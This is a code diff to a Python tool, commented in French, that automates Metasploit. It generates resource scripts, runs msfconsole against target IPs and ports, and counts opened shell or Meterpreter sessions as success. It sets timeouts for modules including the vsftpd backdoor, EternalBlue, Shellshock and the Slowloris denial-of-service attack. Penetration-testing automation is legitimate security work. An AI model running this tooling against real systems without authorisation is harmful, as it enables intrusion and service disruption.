@@ -4,6 +4,7 @@ import json
 from datetime import datetime
 from utils.logger import get_logger
 import re
+import time
 
 # Configuration du logger
 logger = get_logger('metasploit_auto')
@@ -51,6 +52,16 @@ EXPLOIT_MAP = {
 # Répertoire pour les rapports d'exploitation
 EXPLOITS_DIR = "exploit_reports"
 os.makedirs(EXPLOITS_DIR, exist_ok=True)
+
+# Configuration des délais d'attente par module (en secondes)
+TIMEOUT_CONFIG = {
+    "exploit/unix/ftp/vsftpd_234_backdoor": 300,  # 5 minutes pour vsftpd backdoor
+    "exploit/unix/ftp/proftpd_133c_backdoor": 300,  # 5 minutes pour proftpd backdoor
+    "auxiliary/dos/http/slowloris": 600,  # 10 minutes pour Slowloris
+    "exploit/multi/http/apache_mod_cgi_bash_env_exec": 300,  # 5 minutes pour Shellshock
+    "exploit/windows/smb/ms17_010_eternalblue": 420,  # 7 minutes pour EternalBlue
+    "DEFAULT": 180  # 3 minutes par défaut
+}
 
 def map_vuln_to_metasploit(vuln_name):
     """
@@ -123,7 +134,13 @@ set RPORT {target_port}
         else:
             rc_content += "run\n"
     else:
-        rc_content += "exploit -z\n"  # -z pour ne pas interagir avec la session
+        # Modifications spécifiques pour vsftpd_234_backdoor
+        if "vsftpd_234_backdoor" in metasploit_module:
+            # Ajouter un délai avant d'exploiter et augmenter le timeout
+            rc_content += "set ConnectTimeout 60\n"
+            rc_content += "exploit -z\n"  # -z pour ne pas interagir avec la session
+        else:
+            rc_content += "exploit -z\n"  # -z pour ne pas interagir avec la session
     
     # Créer le répertoire si nécessaire
     os.makedirs("scripts", exist_ok=True)
@@ -140,6 +157,114 @@ set RPORT {target_port}
     logger.debug(f"Contenu du fichier RC:\n{rc_content}")
     
     return rc_path
+
+def run_metasploit_module(module, rc_file, timeout_value):
+    """
+    Exécute un module Metasploit avec gestion avancée des erreurs et relances
+    
+    Args:
+        module (str): Module Metasploit à utiliser
+        rc_file (str): Chemin vers le fichier RC
+        timeout_value (int): Délai d'attente en secondes
+        
+    Returns:
+        tuple: (success, output, error)
+    """
+    # Nombre de tentatives maximal
+    max_attempts = 2
+    current_attempt = 0
+    
+    while current_attempt < max_attempts:
+        current_attempt += 1
+        logger.info(f"Tentative {current_attempt}/{max_attempts} d'exécution de msfconsole avec {rc_file}")
+        
+        try:
+            # Pour vsftpd_backdoor, utiliser une approche différente
+            if "vsftpd_234_backdoor" in module:
+                # Exécuter la commande avec un pipe pour pouvoir interagir avec elle
+                process = subprocess.Popen(
+                    ["msfconsole", "-q", "-r", rc_file],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    bufsize=1
+                )
+                
+                # Attendre un certain temps pour l'initialisation
+                start_time = time.time()
+                output_lines = []
+                
+                # Boucle de lecture de la sortie avec timeout
+                while time.time() - start_time < timeout_value:
+                    # Vérifier si le processus est toujours en cours
+                    if process.poll() is not None:
+                        break
+                    
+                    # Lire la sortie disponible
+                    line = process.stdout.readline()
+                    if line:
+                        output_lines.append(line)
+                        logger.debug(f"Output: {line.strip()}")
+                        
+                        # Si une session est créée, considérer comme un succès
+                        if "Command shell session" in line or "Meterpreter session" in line:
+                            logger.info("Session établie avec succès!")
+                            # Laisser un peu de temps pour récupérer toutes les informations
+                            time.sleep(5)
+                            break
+                    
+                    # Petit délai pour éviter de surcharger le CPU
+                    time.sleep(0.1)
+                
+                # Si le processus est toujours en cours après le timeout, le terminer
+                if process.poll() is None:
+                    logger.warning(f"Timeout atteint après {timeout_value}s, terminaison du processus")
+                    process.terminate()
+                    try:
+                        process.wait(timeout=10)  # Attendre la fin du processus
+                    except subprocess.TimeoutExpired:
+                        logger.error("Le processus ne répond pas, force kill")
+                        process.kill()
+                
+                # Récupérer toute sortie restante
+                stdout, stderr = process.communicate()
+                if stdout:
+                    output_lines.append(stdout)
+                
+                output = "".join(output_lines)
+                
+                # Vérifier si l'exploitation a réussi
+                success = "Command shell session" in output or "Meterpreter session" in output
+                return success, output, None
+            else:
+                # Pour les autres modules, utiliser l'approche standard
+                output = subprocess.check_output(
+                    ["msfconsole", "-q", "-r", rc_file], 
+                    stderr=subprocess.STDOUT, 
+                    text=True,
+                    timeout=timeout_value
+                )
+                return True, output, None
+                
+        except subprocess.TimeoutExpired:
+            logger.warning(f"Timeout atteint après {timeout_value}s lors de la tentative {current_attempt}")
+            if current_attempt < max_attempts:
+                logger.info(f"Nouvelle tentative avec un délai d'attente augmenté")
+                timeout_value = timeout_value * 1.5  # Augmenter le timeout de 50%
+            else:
+                logger.error(f"Échec après {max_attempts} tentatives")
+                return False, None, f"Timeout lors de l'exécution de Metasploit après {timeout_value}s"
+                
+        except subprocess.CalledProcessError as e:
+            logger.error(f"Erreur d'exécution Metasploit: {e.output}")
+            return False, None, f"Erreur d'exécution Metasploit: {e.output}"
+            
+        except Exception as e:
+            logger.error(f"Erreur inattendue: {str(e)}")
+            return False, None, f"Erreur inattendue: {str(e)}"
+    
+    # Si on arrive ici, c'est qu'on a épuisé toutes les tentatives
+    return False, None, f"Échec après {max_attempts} tentatives"
 
 def run_metasploit_auto(vuln_data, custom_options=None):
     """
@@ -217,25 +342,18 @@ def run_metasploit_auto(vuln_data, custom_options=None):
             "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
     
+    # Déterminer le timeout à utiliser
+    if module in TIMEOUT_CONFIG:
+        timeout_value = TIMEOUT_CONFIG[module]
+    else:
+        # Utiliser le timeout par défaut
+        timeout_value = TIMEOUT_CONFIG["DEFAULT"]
+        
+    logger.info(f"Utilisation d'un timeout de {timeout_value}s pour le module {module}")
+    
     # Exécuter Metasploit
     try:
-        # Déterminer si ce module est de type DoS ou pourrait prendre plus de temps
-        is_dos_module = "dos" in module.lower() or "slowloris" in module.lower()
-        
-        # Définir un timeout adapté au type de module
-        if is_dos_module:
-            timeout_value = 600  # 10 minutes pour les modules DoS
-        else:
-            timeout_value = 180  # 3 minutes pour les autres modules
-            
-        logger.info(f"Exécution de msfconsole avec le fichier RC: {rc_file} (timeout: {timeout_value}s)")
-        
-        output = subprocess.check_output(
-            ["msfconsole", "-q", "-r", rc_file], 
-            stderr=subprocess.STDOUT, 
-            text=True,
-            timeout=timeout_value
-        )
+        success, output, error = run_metasploit_module(module, rc_file, timeout_value)
         
         # Générer un rapport d'exploitation
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -247,82 +365,35 @@ def run_metasploit_auto(vuln_data, custom_options=None):
             "port": port,
             "module": module,
             "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "output": output,
-            "success": "failed" not in output.lower() and "error" not in output.lower(),
+            "output": output or error or "Aucune sortie disponible",
+            "success": success,
             "options": options
         }
         
         with open(report_file, "w") as f:
             json.dump(report_data, f, indent=4)
         
-        # Déterminer si l'exploitation a réussi
-        success = "failed" not in output.lower() and "error" not in output.lower() and "session" in output.lower()
+        # Déterminer le statut final
         status = "Réussi" if success else "Échec"
         
         logger.info(f"Exploitation {status}: {vuln_id} sur {ip}:{port}")
         logger.debug(f"Rapport sauvegardé: {report_file}")
         
-        return {
+        result = {
             "success": success,
-            "output": output,
+            "output": output or "",
             "module": module,
             "report_file": report_file,
             "status": status,
             "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
         
-    except subprocess.TimeoutExpired:
-        # Vérifier si c'est un module DoS
-        is_dos_module = "dos" in module.lower() or "slowloris" in module.lower() or "ddos" in module.lower()
-        
-        if is_dos_module:
-            # Pour les modules DoS, un timeout peut être considéré comme un succès
-            logger.info(f"Module DoS en cours d'exécution (timeout atteint pour {vuln_id} sur {ip}:{port})")
+        # Ajouter l'erreur si présente
+        if error:
+            result["error"] = error
             
-            # Générer un rapport même en cas de timeout pour les modules DoS
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            report_file = f"{EXPLOITS_DIR}/exploit_report_{timestamp}.json"
-            
-            report_data = {
-                "vulnerability": vuln_id,
-                "target": ip,
-                "port": port,
-                "module": module,
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "output": "Exécution prolongée du module DoS - l'attaque est probablement active.",
-                "success": True,  # Considérer comme un succès pour les DoS
-                "options": options,
-                "timeout_occurred": True
-            }
-            
-            with open(report_file, "w") as f:
-                json.dump(report_data, f, indent=4)
-            
-            return {
-                "success": True,
-                "output": "Le module DoS s'exécute plus longtemps que la durée maximale définie, ce qui peut indiquer que l'attaque fonctionne.",
-                "module": module,
-                "report_file": report_file,
-                "status": "En cours (timeout)",
-                "is_dos": True,
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            }
-        else:
-            # Pour les autres modules, un timeout est une erreur
-            logger.error(f"Timeout lors de l'exécution de Metasploit pour {vuln_id} sur {ip}:{port}")
-            return {
-                "success": False, 
-                "error": "Timeout lors de l'exécution de Metasploit",
-                "timeout_duration": "10 minutes" if is_dos_module else "3 minutes",
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            }
-    except subprocess.CalledProcessError as e:
-        logger.error(f"Erreur d'exécution Metasploit: {e.output}", exc_info=True)
-        return {
-            "success": False,
-            "error": f"Erreur d'exécution Metasploit: {e.output}",
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
+        return result
+    
     except Exception as e:
         logger.error(f"Erreur inattendue: {str(e)}", exc_info=True)
         return {
